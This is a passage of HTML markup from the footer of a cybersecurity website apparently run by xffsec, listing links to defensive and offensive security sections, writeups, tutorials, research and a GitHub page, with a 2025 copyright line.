href="/defensive-security">Defensive Security</a></li><li class="footer__item"><a class="footer__link-item" href="/offensive-security">Offensive Security</a></li><li class="footer__item"><a class="footer__link-item" href="/writeups">Writeups</a></li><li class="footer__item"><a class="footer__link-item" href="/tutorials">Tutorials</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/research">Research &amp; Dev</a></li><li class="footer__item"><a href="https://github.com/xffsec" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 xffsec. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>